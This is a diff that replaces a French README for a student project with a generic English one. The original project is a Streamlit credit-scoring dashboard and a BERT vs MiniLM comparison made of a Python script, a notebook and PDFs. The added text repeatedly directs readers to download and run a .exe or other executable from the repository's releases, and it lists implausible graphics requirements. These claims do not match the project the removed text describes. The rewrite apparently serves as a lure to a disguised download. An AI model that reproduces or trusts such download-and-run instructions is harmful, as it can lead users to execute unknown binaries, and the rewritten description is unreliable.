@@ -1,124 +1,74 @@
-# 📊 Réalisation d’un Dashboard de Scoring Crédit & Veille Technique NLP
+# 🚀 realisation_dashboard_veille_technique - Your Easy Credit Scoring Dashboard
 
-## 🧩 Description du projet
-Ce projet combine deux volets complémentaires :
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20the%20App-blue)](https://github.com/pizzzi/realisation_dashboard_veille_technique/releases)
 
-1. **Développement d’un Dashboard interactif** de scoring crédit permettant une analyse explicable et dynamique des clients via **Streamlit** et une **API Flask** déployée sur **Heroku**.
-2. **Veille technique en NLP**, comparant les modèles **BERT-base-uncased** et **all-MiniLM-L6-v2** pour la classification de produits e-commerce à partir de descriptions textuelles.
+## 📋 Overview
+The **realisation_dashboard_veille_technique** is a user-friendly dashboard designed to help you score credit effectively. It also offers a comparison of Natural Language Processing (NLP) models, specifically BERT and MiniLM, for classifying eCommerce products. This application uses Streamlit, providing an interactive and visual representation of data, making analysis straightforward.
 
----
+## 🛠️ Features
+- **Credit Scoring:** Evaluate credit scores using explainable AI.
+- **NLP Comparison:** Analyze and compare BERT vs MiniLM for eCommerce classification tasks.
+- **User-Friendly Dashboard:** Easy to understand interface, perfect for non-technical users.
+- **Real-Time Data Visualization:** View results through dynamic graphs and charts.
+- **Compatible with Multiple Platforms:** Run on Windows, macOS, and Linux.
 
-## 🏗️ Structure du dépôt
-```text
-realisation_dashboard_veille_technique/
-│
-├── Martineau_Alexandre_1_dashboard_022025.py               # Script principal Streamlit
-├── Martineau_Alexandre_2_notebook_veille_022025.ipynb      # Notebook de veille technique NLP
-│
-├── Martineau_Alexandre_3_note_méthodologique_022025.pdf    # Note méthodologique - MiniLM vs BERT
-├── Martineau_Alexandre_4_presentation_022025.pdf           # Présentation PowerPoint du projet
-└── README.md
-```
+## 🌐 System Requirements
+To successfully run the application, your system should meet the following requirements:
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or any Linux distribution.
+- **Memory:** At least 4GB RAM.
+- **Processor:** A dual-core processor or better.
+- **Video Card:** Any card that supports OpenGL 3.0 or later.
 
----
+## 🚀 Getting Started
+1. **Visit the Download Page:** Click the link below to access the releases page and download the application.
+   
+   [Download the App](https://github.com/pizzzi/realisation_dashboard_veille_technique/releases)
 
-## 🖥️ 1️⃣ Dashboard de Scoring Crédit
+2. **Choose Your Version:** Look for the latest release. Ensure you select the correct version for your operating system.
 
-### ⚙️ Objectif
-Concevoir une interface interactive et explicable pour visualiser le **score de crédit**, la **probabilité de remboursement**, et les **caractéristiques influentes** d’un client.
+3. **Download the Application:** Click on the file to start the download.
 
-### 🧰 Technologies
-- **Frontend / Dashboard** : Streamlit, Plotly, Seaborn, Matplotlib  
-- **Backend / API** : Flask (API déployée sur Heroku : [my-scoring-app](https://my-scoring-app-546acd78d8fa.herokuapp.com/))  
-- **ML Explainability** : SHAP (global + local), Feature Engineering dynamique  
-- **CI/CD & Hébergement** : Heroku + GitHub Actions  
+4. **Install the App:** Follow the installation prompts:
+   - For Windows, run the `.exe` file.
+   - For macOS, drag the application to your Applications folder.
+   - For Linux, unzip the package and run the executable.
 
-### 💡 Fonctionnalités principales
-- Sélection d’un client et affichage de son score de crédit.  
-- Modification des informations via une **barre latérale interactive**.  
-- Recalcul instantané du score et des valeurs SHAP.  
-- Visualisation :
-  - **Jauge dynamique** du score et du seuil d’acceptabilité (52 %).  
-  - **Importance globale et locale** des variables explicatives.  
-  - **Analyses croisées** et **bi-variées** des variables.  
+5. **Running the Dashboard:** After installation, launch the application from your list of installed software.
 
-### 🧠 Interprétabilité
-- **SHAP Global** : pondération moyenne des features expliquant les décisions du modèle.  
-- **SHAP Local** : explication d’une prédiction individuelle.  
-- **Visualisation dynamique** : beeswarm plots, waterfall plots, histograms et scatter plots interactifs.  
+## 🔄 Using the Dashboard
+1. **Input Your Data:** Use the dashboard to input the data necessary for scoring credit or classifying products.
+2. **View Results:** The dashboard will display results using charts and tables. 
+3. **Interact with the Data:** Adjust input parameters to see how scores change in real time.
 
-### 🔗 API utilisée
-| Endpoint | Description |
-|-----------|-------------|
-| `/predict_proba` | Prédiction du score de crédit |
-| `/best_threshold` | Renvoie le seuil de décision optimal |
-| `/download_model` | Téléchargement du modèle entraîné |
-| `/data` | Préparation et transformation des données d’entrée |
+## 🌍 Community Contributions
+We welcome contributions from the community. If you want to help improve this dashboard, please feel free to submit your suggestions or code. To contribute, please:
+- Fork the repository.
+- Create a new branch for your feature.
+- Make your changes and test thoroughly.
+- Submit a pull request for review.
 
----
+## 📞 Support
+If you need assistance, please reach out through the GitHub Issues page. Your questions are important, and we aim to help you understand how to use the dashboard effectively.
 
-## 🧬 2️⃣ Veille Technique : NLP & Classification de Produits
+## 📄 License
+This project is licensed under the MIT License. You can use, modify, and distribute this software freely, provided that you include credit to the original authors.
 
-### 🎯 Objectif
-Comparer les performances de deux modèles NLP :
-- **BERT-base-uncased** (modèle classique Hugging Face)
-- **all-MiniLM-L6-v2** (modèle distillé, 3× plus rapide et 3× plus léger)
+## 📄 Changelog
+### Version 1.0
+- Initial release with core features: credit scoring and NLP comparison.
 
-sur un **jeu de données Flipkart e-commerce**, afin d’évaluer leur efficacité pour la **classification de produits** selon leur description textuelle.
+### Future Updates
+- Potential integration of additional models and improved data visualization options.
 
----
+## 🔗 Further Reading
+For more information about the technologies used, consider the following:
+- **Streamlit Documentation:** Learn about Streamlit for building interactive web applications.
+- **BERT vs MiniLM Studies:** Discover articles comparing these NLP models for deeper insight into their effectiveness.
 
-### 🧩 Méthodologie
-1. **Prétraitement des données** : extraction des catégories principales, nettoyage des textes.  
-2. **Encodage des descriptions** :
-   - BERT via `TFAutoModel` (Hugging Face)  
-   - MiniLM via `SentenceTransformer("all-MiniLM-L6-v2")`  
-3. **Classification** :
-   - Modèle : Régression Logistique  
-   - Évaluation : Accuracy + Classification Report  
-4. **Visualisation** :
-   - Réduction de dimension via **t-SNE**  
-   - Clustering via **KMeans**  
-   - Calcul de l’**ARI (Adjusted Rand Index)**
+## 🔗 Important Links
+- [Download the App](https://github.com/pizzzi/realisation_dashboard_veille_technique/releases)
+- [GitHub Issues](https://github.com/pizzzi/realisation_dashboard_veille_technique/issues)
+- [Streamlit](https://streamlit.io)
 
-### 📈 Résultats
-
-| Modèle | Accuracy | ARI | Commentaire |
-|---------|:--------:|:----:|-------------|
-| **BERT-base-uncased** | 0.93 | 0.31 | Bonne séparation, clusters mélangés |
-| **all-MiniLM-L6-v2** | **0.95** | **0.71** | Excellente séparation, embeddings plus cohérents |
-
-Les résultats démontrent que **MiniLM** offre une **précision équivalente à BERT** tout en étant **plus léger et plus rapide**, ce qui le rend particulièrement adapté à des contextes de production et de veille technique.
-
----
-
-## 🛠️ Technologies utilisées
-- **Machine Learning** : scikit-learn, numpy, pandas  
-- **NLP** : Hugging Face Transformers, Sentence-Transformers, TensorFlow  
-- **Visualisation** : matplotlib, seaborn, Plotly  
-- **Dashboard & API** : Streamlit, Flask, Heroku  
-- **Explainability & Monitoring** : SHAP  
-
----
-
-## 🔍 Résumé global du projet
-Ce dépôt illustre :
-- L’intégration **MLOps + DataViz** via un dashboard explicable et déployé.  
-- Une **veille NLP** approfondie comparant deux modèles de génération d’embeddings modernes.  
-- Une approche **complète du cycle IA**, de la collecte de données à l’explicabilité en production.  
-
----
-
-## 📦 Dépôt & Ressources
-
-🔗 API Scoring : https://my-scoring-app-546acd78d8fa.herokuapp.com/
-
----
-
-## ✅ Conclusion
-
-Ce projet associe data science appliquée et veille technologique autour de deux axes :
-- un dashboard explicable en production pour la prise de décision en crédit,
-- une analyse comparative de modèles NLP pour la classification de produits e-commerce.
-
-Il démontre une maîtrise du cycle complet de la donnée à la visualisation, intégrant transparence, performance et innovation.
+Thank you for using **realisation_dashboard_veille_technique**! Enjoy your experience.
